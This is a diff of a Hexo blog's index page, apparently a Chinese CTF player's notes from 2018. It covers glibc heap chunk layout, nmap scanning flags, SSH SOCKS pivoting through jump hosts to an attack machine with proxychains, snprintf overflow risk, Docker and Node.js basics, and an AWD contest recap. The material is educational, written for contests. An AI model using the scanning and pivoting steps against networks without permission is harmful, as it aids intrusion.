+<p><code>prev_size</code>：当前一个堆块为<code>free</code>状态时，存放前一个堆块的大小。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据，本字段不计入chunk的大小计算。<br><code>size</code>：本堆块的大小，计算方法为<code>size字段(32位为4|64位为8)+用户申请的大小+对齐</code>，32位下对8对齐，64位下对16对齐。且chunk地址的偏移为相邻上一个chunk的地址+上一个chunk的size。在pwndbg中调试好像会加上一位<strong>PREV_INUSE</strong>。<br><code>fb&amp;bk</code>：当chunk为<code>free</code>的状态时，分别指向chunk所在单向链表中的前一个chunk和后一个chunk。在被分配状态时，均用来存储数据，<code>fb</code>为存储数据的开始位置。<br><code>fb_nextsize&amp;bk_nextsize</code>：在被分配状态时也用来存储数据，在<code>free</code>状态时只在large bin中用到，目前没有用，等用到了再总结。</p>
+<h2 id="堆块分配机制"><a href="#堆块分配机制" class="headerlink" title="堆块分配机制"></a>堆块分配机制</h2><h3 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h3><blockquote>
+<p>A bin is a list (doubly or singly linked list) of free (non-allocated) chunks.</p>
+</blockquote>
+<p>bin为一个单向或者双向链表存放空闲的chunk，下一次分配时，若bin中有大小合适的chunk会直接分配出去。bin由存放其中的chunk大小分类为<code>fastbin</code>、<code>smallbin</code>、<code>largebin</code>。<br>比较常用的是<strong>fastbin</strong>，在32位系统下fastbin主要存储0-80字节的chunk，在64位系统下存储0-160字节的chunk。<br>其中还有一个<code>unsorted bin</code>，是当<code>small chunk</code>或<code>large chunk</code>free掉之后，不会直接进入smallbin或largebin，而是会先进入unsortedbin</p>
+<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>个人理解arena为chunk的存储组织形式，在arena的最上层始终为<strong>Top chunk</strong>，向下分出用户chunk，其中主线程中的arena为main arena。</p>
+<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk为arena的边界，当bin中无合适的chunk分配时，会将top chunk分出一部分进行分配。<br>当与top chunk相邻的chunk处于free状态时，该chunk不会进入bin中，而是会合并入top chunk。</p>
+<h2 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h2><ol>
+<li><code>malloc</code>返回的是chunk的fd指针，也就是在调试时heap地址+8.</li>
+</ol>
+
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/07/nmap使用/" id="title">nmap使用</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-07</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>nmap参数总结</p>
+<h2 id="目标说明"><a href="#目标说明" class="headerlink" title="目标说明"></a>目标说明</h2><p>192.168.0.0/24 表示扫描192.168.0.0-192.168.0.255范围的IP</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><strong>-sP</strong> 以ping的方式扫描主机<br><strong>-sn</strong> ping侦测主机，不扫描端口</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>-sS</strong> TCP SYN扫描，是默认的扫描方式<br><strong>-sT</strong> TCP connect()扫描，要三次握手<br><strong>-sU</strong> UDP方式扫描</p>
+<p>默认情况下对1-1024端口进行扫描<br><strong>-p</strong> 指定端口扫描范围，-p-为扫描1-65535端口<br><strong>-F</strong> 快速有限的端口扫描<br><strong>–top-ports (numeber)</strong> 扫描常规端口</p>
+
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/12/06/内网链路搭建总结/" id="title">内网链路搭建总结</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-12-06</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>参加xnuca的线下赛，多级的内网环境使得比赛体验很差，特此总结一下链路的搭建。</p>
+<h2 id="一级"><a href="#一级" class="headerlink" title="一级"></a>一级</h2><p>一级链路为个人PC通过跳板机访问内网的服务，一般提供ssh的用户密码，指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -2 -D 2335 iiebc@xx.xxx.xx.xx</span><br></pre></td></tr></table></figure>
+<p>然后便可以配置proxychains（/etc/proxychains.conf）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 2335</span><br></pre></td></tr></table></figure>
+<p>通过proxychains或者浏览器中挂代理(socks5)的形式来访问内网服务。<br>比赛中有另一种情况，个人PC是windows系统时，需要使用linux虚拟机来ssh搭接链路，所以要挂在<code>0.0.0.0</code>上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -2 -D 0.0.0.0:2335 iiebc@xx.xxx.xx.xx</span><br></pre></td></tr></table></figure>
+<p>然后就可以正常在windows浏览器上挂上虚拟机IP代理，全局的话，尝试使用proxifier，用不了……</p>
+<h2 id="二级"><a href="#二级" class="headerlink" title="二级"></a>二级</h2><p>二级链路是个人PC要通过跳板机连接攻击机再访问靶机，ssh方式比较稳定，但在只有webshell的情况下也只能用ew之类的不稳定服务。<br>总结一下ssh，先ssh连接跳板机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1080:127.0.0.1:2335 iiebc@10.xxx.1.10</span><br></pre></td></tr></table></figure>
+<p>然后在跳板机上连接攻击机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -2 -D 2335 attacker@10.xxx.1.30</span><br></pre></td></tr></table></figure>
+<p>proxychains：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+<h2 id="多级"><a href="#多级" class="headerlink" title="多级"></a>多级</h2><p>多级链路应该按照二级链路的思路，一一端口映射过来，应该可以打通，没有试过……</p>
+
+                
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/11/22/docker学习/" id="title">docker学习</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-11-22</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
+                
+                <p>今天白天摸了一下docker，晚上来总结一波。<br>首先安装docker，鉴于之前装了双系统后面发现没用的经验，直接用windows安装了docker，docker-windows只支持win10 pro和企业版，较早版本的windows只能安装docker-toolbox来使用docker。<br>装完后可能会有个更换国内源的问题：<code>docker-machine ssh default</code>进入虚拟机，然后<code>vi /var/lib/boot2docker/profile</code>，加一行<code>--registry-mirror=国内源</code><br>接下来一些命令：<br>拉取镜像</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
 <p>删除镜像</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm 镜像名</span><br></pre></td></tr></table></figure>
@@ -213,125 +284,37 @@
 <p>要创建更加完整的环境，大概有两种方法，第一种是用Dockerfile创建linux容器并在其中下载配置相应的环境。第二种是使用多容器协同的方式使用。(Dockerfile要相对简单一些)</p>
 <p>之后再找时间继续学习Dockerfile的具体部署。</p>
 
-        
+                
+            </article>
+            <hr width="90%" color="#ddd">
         </div>
-        <footer class="article-footer">
-            <div class="share-container">
-
-
-
-</div>
-
-    <a data-url="http://yoursite.com/2018/11/22/docker学习/" data-id="cjosrsk5900008giinp83k884" class="article-share-link"><i class="fas fa-share"></i>Share</a>
-<script>
-    (function ($) {
-        // Prevent duplicate binding
-        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
-            __SHARE_BUTTON_BINDED__ = true;
-        } else {
-            return;
-        }
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fab fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fab fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fab fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fab fa-google article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
-        });
-    })(jQuery);
-</script>
-
-            
-    
-
-        </footer>
-    </div>
-    
-</article>
-
-
-
-    <article id="post-CTF初次线下总结" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
         
-        
-            <header class="article-header">
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/11/22/pwn-漏洞函数笔记/" id="title">【PWN】漏洞函数笔记</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-11-22</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
                 
-    
-        <h1 itemprop="name">
-            <a class="article-title" href="/2018/10/29/CTF初次线下总结/">CTF初次线下总结</a>
-        </h1>
-    
+                <h2 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h2><p><code>snprintf()</code>，函数原型为<code>int snprintf(char *str, size_t size, const char *format, …)</code><br>将可变个参数(…)按照format格式化成字符串，然后将其复制到str中 (1) 如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给其后添加一个字符串结束符(‘\0’)； (2) 如果格式化后的字符串长度 &gt;= size，则只将其中的(size-1)个字符复制到str中，并给其后添加一个字符串结束符(‘\0’)，返回值为欲写入的字符串长度。<br><em>漏洞点</em>：函数返回值为<strong>欲写入的字符串长度</strong>，若用来做数组下标，可能会产生溢出。</p>
 
                 
-                    <div class="article-meta">
-                        
-    <div class="article-date">
-        <i class="fas fa-calendar-alt"></i>
-        <a href="/2018/10/29/CTF初次线下总结/">
-            <time datetime="2018-10-29T13:37:56.000Z" itemprop="datePublished">2018-10-29</time>
-        </a>
-    </div>
-
-
-                        
-                        
-                    </div>
+            </article>
+            <hr width="90%" color="#ddd">
+        </div>
+        
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/10/29/CTF初次线下总结/" id="title">CTF初次线下总结</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-10-29</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
                 
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
-            
-            <p>刚参加完2018年的江苏省领航杯的线下赛，总结一番。</p>
+                <p>刚参加完2018年的江苏省领航杯的线下赛，总结一番。</p>
 <p>这次线下赛的形式跟正常的AWD不同，原先准备的徐师傅的awd自动化框架没有实战的机会，有点可惜。比赛时给了四根网线，两根攻击网线连接靶场，两根防御网线连接加固机，一台二进制，一台web机，但是比赛中好像并没有看见AI对二进制机的攻击……，我主要负责加固部分，所以主要总结一下防御部分，和提醒自己的学习不足之处。</p>
 <h2 id="起手"><a href="#起手" class="headerlink" title="起手"></a>起手</h2><p>由于是第一次参加awd形式的线下赛，所以赛前准备了许多起手式，参考了一番<a href="https://blog.csdn.net/like98k/article/details/80261603" target="_blank" rel="noopener">郁离歌</a>的起手式……</p>
 <ol>
@@ -355,353 +338,47 @@
 </ul>
 <p>还有好多东西要学啊……(╯‵□′)╯︵┻━┻</p>
 
-        
+                
+            </article>
+            <hr width="90%" color="#ddd">
         </div>
-        <footer class="article-footer">
-            <div class="share-container">
-
-
-
-</div>
-
-    <a data-url="http://yoursite.com/2018/10/29/CTF初次线下总结/" data-id="cjosrsk5o00028giih72ys516" class="article-share-link"><i class="fas fa-share"></i>Share</a>
-<script>
-    (function ($) {
-        // Prevent duplicate binding
-        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
-            __SHARE_BUTTON_BINDED__ = true;
-        } else {
-            return;
-        }
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fab fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fab fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fab fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fab fa-google article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
-        });
-    })(jQuery);
-</script>
-
-            
-    
-
-        </footer>
-    </div>
-    
-</article>
-
-
-
-    <article id="post-nodejs学习一" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
         
-        
-            <header class="article-header">
+        <div class="content shadow rounded">
+            <h2 class="text-center"><a href="/2018/10/21/nodejs学习一/" id="title">nodejs学习(一)</a></h2>
+            <div class="text-center">
+                <i class="fa fa-calendar"></i>
+                <span>2018-10-21</span>
+            </div>
+            <hr width="90%" color="#ddd">
+            <article>
                 
-    
-        <h1 itemprop="name">
-            <a class="article-title" href="/2018/10/21/nodejs学习一/">nodejs学习(一)</a>
-        </h1>
-    
-
-                
-                    <div class="article-meta">
-                        
-    <div class="article-date">
-        <i class="fas fa-calendar-alt"></i>
-        <a href="/2018/10/21/nodejs学习一/">
-            <time datetime="2018-10-21T13:22:55.000Z" itemprop="datePublished">2018-10-21</time>
-        </a>
-    </div>
-
-
-                        
-                        
-                    </div>
-                
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
-            <p><h2 id="nodejs基础"><a href="#nodejs基础" class="headerlink" title="nodejs基础"></a>nodejs基础</h2><p>nodejs允许自己封装模块，使得编写程序可以模块化，便于维护整理。在一个js文件中写完封装的函数或对象后，可以使用<code>exports</code>或<code>module.exports</code>来将模块中的函数暴露给程序，使得整<br>个程序可以使用，如：</p>
+                <h2 id="nodejs基础"><a href="#nodejs基础" class="headerlink" title="nodejs基础"></a>nodejs基础</h2><p>nodejs允许自己封装模块，使得编写程序可以模块化，便于维护整理。在一个js文件中写完封装的函数或对象后，可以使用<code>exports</code>或<code>module.exports</code>来将模块中的函数暴露给程序，使得整<br>个程序可以使用，如：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HelloWorld</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello, node-js!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.HelloWorld = HelloWorld;</span><br></pre></td></tr></table></figure>
 <p>要使用其他模块中的方法时，需要使用<code>require</code>来导入模块，如：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> helloWorld = <span class="built_in">require</span>(<span class="string">'./helloword'</span>);</span><br></pre></td></tr></table></figure>
 <p>再说回<code>exports</code>和<code>module.exports</code>，两者的功能相同，区别在于，<code>exports</code>是<code>module.exports</code>的缩略写法，如下写法是相同意思：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports.HelloWorld = HelloWorld;</span><br><span class="line">exports.HelloWorld = HelloWorld;</span><br></pre></td></tr></table></figure></p>
-            <p class="article-more-link">
-                <a href="/2018/10/21/nodejs学习一/#more">Read More</a>
-            </p>
-        
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports.HelloWorld = HelloWorld;</span><br><span class="line">exports.HelloWorld = HelloWorld;</span><br></pre></td></tr></table></figure>
+                <a href="/2018/10/21/nodejs学习一/" class="read-more">More</a>
+                
+            </article>
+            <hr width="90%" color="#ddd">
         </div>
-        <footer class="article-footer">
-            <div class="share-container">
-
-
-
-</div>
-
-    <a data-url="http://yoursite.com/2018/10/21/nodejs学习一/" data-id="cjosrsk5o00018giipmhfy726" class="article-share-link"><i class="fas fa-share"></i>Share</a>
+        
+        <div class="content text-center mb-2"><span>Powered By Hexo | theme: <a href="y4ngyy.xyz">y4ngyy</a></span></div>
+<script
+        src="https://code.jquery.com/jquery-3.3.1.min.js"
+        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+        crossorigin="anonymous"></script>
+<script src="/js/highlight.pack.js"></script>
+<script src="/js/nav.js"></script>
 <script>
-    (function ($) {
-        // Prevent duplicate binding
-        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
-            __SHARE_BUTTON_BINDED__ = true;
-        } else {
-            return;
-        }
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fab fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fab fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fab fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fab fa-google article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+    $(document).ready(function() {
+        $('figure').each(function(i, block) {
+            hljs.highlightBlock(block);
         });
-    })(jQuery);
+    });
 </script>
-
-            
-    
-
-        </footer>
-    </div>
-    
-</article>
-
-
-</section>
-            
-                
-<aside id="sidebar">
-   
-        
-    <div class="widget-wrap">
-        <h3 class="widget-title">recent</h3>
-        <div class="widget">
-            <ul id="recent-post" class="">
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2018/11/22/docker学习/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2018/11/22/docker学习/" class="title">docker学习</a></p>
-                            <p class="item-date"><time datetime="2018-11-22T10:44:23.000Z" itemprop="datePublished">2018-11-22</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2018/10/29/CTF初次线下总结/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2018/10/29/CTF初次线下总结/" class="title">CTF初次线下总结</a></p>
-                            <p class="item-date"><time datetime="2018-10-29T13:37:56.000Z" itemprop="datePublished">2018-10-29</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2018/10/21/nodejs学习一/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2018/10/21/nodejs学习一/" class="title">nodejs学习(一)</a></p>
-                            <p class="item-date"><time datetime="2018-10-21T13:22:55.000Z" itemprop="datePublished">2018-10-21</time></p>
-                        </div>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-    
-        
-    
-        
-    <div class="widget-wrap">
-        <h3 class="widget-title">archives</h3>
-        <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">2</span></li></ul>
-        </div>
-    </div>
-
-    
-        
-    
-        
-    
-        
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">links</h3>
-        <div class="widget">
-            <ul>
-                
-            </ul>
-        </div>
-    </div>
-
-
-    
-    <div id="toTop" class="fas fa-angle-up"></div>
-</aside>
-
-            
-        </div>
-        <footer id="footer">
-    <div class="outer">
-        <div id="footer-info" class="inner">
-            &copy; 2018 y4ngyy<br>
-            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
-        </div>
-    </div>
-</footer>
-        
-
-
-    
-        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
-    
-    
-        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
-    
-    
-
-
-
-<!-- Custom Scripts -->
-<script src="/js/main.js"></script>
-
     </div>
 </body>
 </html>
+
